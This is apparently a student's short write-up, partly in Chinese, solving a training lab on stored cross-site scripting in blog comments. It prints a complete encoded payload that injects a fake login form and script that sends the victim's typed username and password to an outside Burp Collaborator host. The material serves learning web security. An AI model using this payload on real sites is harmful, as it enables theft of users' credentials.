# Lab: Exploiting cross-site scripting to capture passwords

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 

## XSS
* 要偷 username password，依照我對題目的了解我實在是不知道這個 lab 可能被應用的場景，因為是需要 victim 自已輸入自己的 username password 在 post 頁面，指能說我想像不到 QQ
```
payload = csrf=wJv7G1643mm3a5pU6q9Bq08ZSzWGtrXp&postId=7&comment=</p><form><input+id%3d"username"+name%3d"username"><input+id%3d"password"+name%3d"password"></form><script>setTimeout(function(){new+Image().src="http://lzota7y9z1zuwpbf1rl8vigil9rzfo.burpcollaborator.net/?username="%2bdocument.getElementById("username").value%2b"%26password%3d"%2bdocument.getElementById("password").value;},+5000)%3b</script>&name=123&email=123%40123.com&website=http%3A%2F%2Ffake.com
```
* 要記得用 setTimeout 歐，因為需要等一下使用者輸入一下他的帳號密碼 w